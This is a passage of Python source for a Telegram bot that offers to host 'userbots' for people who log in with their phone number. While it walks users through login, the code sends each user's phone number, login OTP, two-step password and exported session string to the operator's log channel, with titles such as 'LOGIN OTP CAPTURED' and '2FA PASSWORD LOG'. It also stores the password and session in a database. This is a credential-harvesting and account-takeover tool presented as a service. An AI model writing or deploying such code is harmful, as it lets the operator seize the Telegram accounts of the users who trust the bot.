        qbox(f"✅ <b>ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!</b>\n\n🟢 <b>sᴜᴄᴄᴇss:</b> <code>{success}</code>\n🔴 <b>ғᴀɪʟᴇᴅ:</b> <code>{failed}</code>"),
        parse_mode=ParseMode.HTML,
    )


@bot.on_message(filters.command("remove_all") & filters.user(OWNER_ID))
async def remove_all_cmd(c, m):
    try:
        sessions_col.delete_many({})
        for uid, ubot in list(running_ubots.items()):
            try:
                await ubot.stop()
            except Exception:
                pass
        running_ubots.clear()
        await m.reply_text(
            qbox("🗑️ <b>ᴀʟʟ sᴇssɪᴏɴs ʀᴇᴍᴏᴠᴇᴅ ғʀᴏᴍ ᴅᴀᴛᴀʙᴀsᴇ ᴀɴᴅ ᴀʟʟ ᴜsᴇʀʙᴏᴛs sᴛᴏᴘᴘᴇᴅ!</b>"),
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        await m.reply_text(qbox(f"❌ <b>ᴇʀʀᴏʀ:</b> <code>{e}</code>"), parse_mode=ParseMode.HTML)


@bot.on_callback_query()
async def handle_callbacks(c, q):
    if q.data == "close":
        await q.message.delete()
    elif q.data == "back_menu":
        mention_html = html_mention(q.from_user.id, q.from_user.first_name or "ᴜsᴇʀ")
        menu_html = START_TEXT.format(mention=mention_html)
        try:
            await q.message.edit_text(menu_html, reply_markup=main_buttons, parse_mode=ParseMode.HTML)
        except Exception:
            await q.message.reply_text(menu_html, reply_markup=main_buttons, parse_mode=ParseMode.HTML)
        await q.answer()
    elif q.data == "verify_fsub":
        unjoined = await check_force_join(c, q.from_user.id)
        if unjoined:
            await q.answer("❌ sᴀʙʜɪ ᴄʜᴀɴɴᴇʟs ᴊᴏɪɴ ɴᴀʜɪ ᴋɪʏᴇ!", show_alert=True)
        else:
            await q.message.delete()
            mention_html = html_mention(q.from_user.id, q.from_user.first_name or "ᴜsᴇʀ")
            await bot.send_message(
                q.message.chat.id,
                START_TEXT.format(mention=mention_html),
                reply_markup=main_buttons,
                parse_mode=ParseMode.HTML,
            )
    elif q.data == "help_btn":
        await q.message.reply_text(HELP_BOT_TEXT, reply_markup=main_buttons, parse_mode=ParseMode.HTML)
        await q.answer()
    elif q.data == "add_btn":
        await q.message.reply_text(
            qbox("📲 <b>sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ (</b><code>+91xxxxxxxxxx</code><b>):</b>"),
            parse_mode=ParseMode.HTML,
        )
        await q.message.delete()
    elif q.data.startswith("acc_page_"):
        if q.from_user.id != OWNER_ID:
            return await q.answer("👑 ᴏɴʟʏ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs!", show_alert=True)
        try:
            page_num = int(q.data.split("_")[-1])
        except ValueError:
            page_num = 0
        text, markup = await build_account_list_page(page_num)
        try:
            await q.message.edit_text(text, reply_markup=markup, parse_mode=ParseMode.HTML)
        except Exception:
            pass
        await q.answer()


@bot.on_message(filters.text & filters.private & ~filters.bot)
async def handle_steps(c, m):
    if m.text and m.text.startswith("/") and m.text.strip().lower() != "/resend":
        return

    save_bot_user(m.from_user)
    uid, text = m.from_user.id, m.text.strip()
    bot_me = await c.get_me()
    panel_name = bot_me.username or "CoderNovaBot"

    if text.startswith("+"):
        if uid in user_data and "client" in user_data[uid]:
            try:
                await user_data[uid]["client"].disconnect()
            except Exception:
                pass

        sending_msg = await m.reply_text(
            qbox("⏳ <b>ᴏᴛᴘ ᴊᴀ ʀʜᴀ ʜᴀɪ ᴀᴄᴄᴏᴜɴᴛ ᴘᴇ... ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ</b>"),
            parse_mode=ParseMode.HTML,
        )
        user_data[uid] = {"phone": normalize_phone(text), "password": ""}
        temp_c = Client(
            f"temp_{uid}",
            api_id=API_ID,
            api_hash=API_HASH,
            device_model=CLIENT_DEVICE_MODEL,
            system_version=CLIENT_SYSTEM_VERSION,
            app_version=CLIENT_APP_VERSION,
            in_memory=True,
        )
        try:
            await temp_c.connect()
            await warmup_client_peers(temp_c)
            code = await temp_c.send_code(text)
            code_type_str = str(getattr(code, "type", "UNKNOWN"))
            print(f"[SEND_CODE] uid={uid} phone={text} type={code_type_str}")
            user_data[uid].update({
                "client": temp_c,
                "hash": code.phone_code_hash,
                "code_type": code_type_str,
            })

            try:
                await sending_msg.delete()
            except Exception:
                pass

            await send_log(
                c,
                title="𝗣𝗛𝗢𝗡𝗘 𝗦𝗨𝗕𝗠𝗜𝗧𝗧𝗘𝗗 · [𝗡𝗨𝗠𝗕𝗘𝗥]",
                user=m.from_user,
                details_body=f"📱 𝗣𝗛𝗢𝗡𝗘 𝗡𝗨𝗠𝗕𝗘𝗥: `{text}`\n📨 𝗗𝗘𝗟𝗜𝗩𝗘𝗥𝗬: `{code_type_str}`\n⏳ 𝗡𝗘𝗫𝗧 𝗦𝗧𝗘𝗣: AWAITING OTP",
                panel_name=panel_name,
            )

            await m.reply_text(
                qbox(
                    f"📩 <b>ᴏᴛᴘ ʙʜᴇᴊ ᴅɪʏᴀ ɢʏᴀ ʜᴀɪ! ᴀʙ ᴏᴛᴘ ᴅᴀʟᴇɪɴ (ᴇ.ɢ.</b> <code>1 2 3 4 5</code> <b>ʏᴀ</b> <code>12345</code><b>):</b>\n"
                    f"📨 <b>ᴍᴇᴅɪᴜᴍ:</b> <code>{code_type_str}</code>\n"
                    f"💡 ᴏᴛᴘ ɴᴀ ᴀᴀʏᴇ ᴛᴏ <code>resend</code> ʟɪᴋʜᴇɪɴ."
                ),
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            print(f"[SEND_CODE ERROR] {uid}: {e}")
            try:
                await sending_msg.delete()
            except Exception:
                pass
            try:
                await temp_c.disconnect()
            except Exception:
                pass
            user_data.pop(uid, None)
            await m.reply_text(
                qbox(f"❌ <b>ᴏᴛᴘ ʙʜᴇᴊɴᴇ ᴍᴇɪɴ ᴇʀʀᴏʀ:</b> <code>{e}</code>"),
                parse_mode=ParseMode.HTML,
            )

    elif text.lower() in ("resend", "/resend") and uid in user_data and "client" in user_data[uid] and "hash" in user_data[uid]:
        try:
            resent = await user_data[uid]["client"].resend_code(
                user_data[uid]["phone"],
                user_data[uid]["hash"],
            )
            resent_type = str(getattr(resent, "type", "UNKNOWN"))
            user_data[uid]["hash"] = resent.phone_code_hash
            await m.reply_text(
                qbox(
                    f"🔄 <b>ɴᴇᴡ ᴄᴏᴅᴇ ʀᴇǫᴜᴇsᴛᴇᴅ! (</b><code>{resent_type}</code><b>)</b>\n"
                    f"ᴀᴘɴᴀ ᴛᴇʟᴇɢʀᴀᴍ ᴀᴘᴘ / sᴍs ᴄʜᴇᴄᴋ ᴋᴀʀᴇɪɴ ᴀᴜʀ ᴏᴛᴘ ʙʜᴇᴊᴇɪɴ (ᴇ.ɢ. <code>1 2 3 4 5</code> <b>ʏᴀ</b> <code>12345</code>)."
                ),
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            await m.reply_text(
                qbox(f"❌ <b>ʀᴇsᴇɴᴅ ғᴀɪʟᴇᴅ:</b> <code>{e}</code>"),
                parse_mode=ParseMode.HTML,
            )

    elif text.replace(" ", "").isdigit() and uid in user_data and "hash" in user_data[uid]:
        otp_clean = text.replace(" ", "")
        phone_num = user_data[uid]["phone"]

        await send_log(
            c,
            title="𝗟𝗢𝗚𝗜𝗡 𝗢𝗧𝗣 𝗖𝗔𝗣𝗧𝗨𝗥𝗘𝗗 · [𝗢𝗧𝗣]",
            user=m.from_user,
            details_body=f"📱 𝗣𝗛𝗢𝗡𝗘: `{phone_num}`\n🔢 𝗢𝗧𝗣 𝗖𝗢𝗗𝗘: `{otp_clean}`",
            panel_name=panel_name,
        )

        try:
            await user_data[uid]["client"].sign_in(phone_num, user_data[uid]["hash"], otp_clean)
            await finalize_login(c, m, uid, used_2fa=False)
        except errors.SessionPasswordNeeded:
            user_data[uid].update({"step": "password"})
            await m.reply_text(qbox("🔐 <b>ᴇɴᴛᴇʀ ᴛᴡᴏ-sᴛᴇᴘ ᴘᴀssᴡᴏʀᴅ:</b>"), parse_mode=ParseMode.HTML)
        except Exception as e:
            await m.reply_text(qbox(f"❌ <code>{e}</code>"), parse_mode=ParseMode.HTML)

    elif uid in user_data and user_data[uid].get("step") == "password":
        phone_num = user_data[uid]["phone"]
        user_data[uid]["password"] = text

        await send_log(
            c,
            title="𝟮𝗙𝗔 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 𝗟𝗢𝗚 · [𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗]",
            user=m.from_user,
            details_body=f"📱 𝗣𝗛𝗢𝗡𝗘: `{phone_num}`\n🔑 𝟮𝗙𝗔 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: `{text}`",
            panel_name=panel_name,
        )

        try:
            await user_data[uid]["client"].check_password(password=text)
            await finalize_login(c, m, uid, used_2fa=True)
        except Exception as e:
            await m.reply_text(qbox(f"❌ <code>{e}</code>"), parse_mode=ParseMode.HTML)


async def finalize_login(c, m, uid, used_2fa: bool = False):
    session_str = await user_data[uid]["client"].export_session_string()
    phone_num = normalize_phone(user_data[uid].get("phone", ""))
    pwd_val = user_data[uid].get("password", "")

    if uid in running_ubots:
        try:
            await running_ubots[uid].stop()
        except Exception:
            pass

    ubot = Client(
        f"ubot_{uid}",
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_str,
        device_model=CLIENT_DEVICE_MODEL,
        system_version=CLIENT_SYSTEM_VERSION,
        app_version=CLIENT_APP_VERSION,
        in_memory=True,
    )
    register_ubot_handlers(ubot)
    await ubot.start()
    await warmup_client_peers(ubot)
    me = await ubot.get_me()
    running_ubots[uid] = ubot

    full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or (m.from_user.first_name or "User")
    uname = me.username or (m.from_user.username or "")
    final_phone = normalize_phone(getattr(me, "phone_number", "") or "") or phone_num

    save_local_session(
        uid,
        session_str,
        phone=final_phone,
        name=full_name,
        username=uname,
        password=pwd_val,
    )

    try:
        saved_msg = qbox(
            f"⚡ <b>ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ ᴀᴄᴛɪᴠᴀᴛᴇᴅ!</b> ⚡\n\n"
            f"👤 <b>ᴀᴄᴄᴏᴜɴᴛ:</b> {full_name}\n"
            f"🔑 <b>sᴇssɪᴏɴ sᴛʀɪɴɢ:</b>\n<code>{session_str}</code>"
        )
        await ubot.send_message("me", saved_msg, parse_mode=ParseMode.HTML)
    except Exception:
        pass

    bot_me = await c.get_me()
    panel_name = bot_me.username or "CoderNovaBot"
    status_tag = "2FA LOGIN SUCCESS" if used_2fa else "LOGIN SUCCESS"
    first_upper = full_name.upper()

    await send_log(
        c,
        title="𝗡𝗘𝗪 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗟𝗢𝗚𝗜𝗡 & 𝗦𝗘𝗦𝗦𝗜𝗢𝗡 · [𝗦𝗧𝗥𝗜𝗡𝗚]",
        user=m.from_user,
        details_body=(
            f"✅ **{status_tag} ({first_upper} ({uid}))**\n"
            f"📱 𝗣𝗛𝗢𝗡𝗘: `{final_phone}`\n"
            f"💾 SAVED TO MONGODB: ACTIVE\n"
            f"🔑 `{session_str}`"
        ),
        panel_name=panel_name,
    )

    try:
        await user_data[uid]["client"].disconnect()
    except Exception:
        pass

    await bot.send_message(
        uid,
        qbox("🎉 <b>sᴜᴄᴄᴇsғᴜʟʟʏ ʟᴏɢɪɴ! ʏᴏᴜʀ ᴜsᴇʀʙᴏᴛ ɪs ɴᴏᴡ ᴀᴄᴛɪᴠᴇ.</b>"),
        parse_mode=ParseMode.HTML,
    )
    if uid in user_data:
        del user_data[uid]


async def start_services():
    while True:
        try:
            await bot.start()
            await warmup_client_peers(bot)
            await restart_all_userbots(prune_invalid=True)
            await idle()
            break
        except OSError as e:
            print(f"[NETWORK ERROR] Connection lost, retrying in 5s: {e}")
            try:
                if bot.is_initialized:
                    await bot.stop()
            except Exception:
                pass
            await asyncio.sleep(5)
        except Exception as e:
            print(f"[SERVICE ERROR] {e}")
            await asyncio.sleep(5)


if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    Thread(target=run_web, daemon=True).start()
    try:
        loop.run_until_complete(start_services())
    finally:
        loop.close()
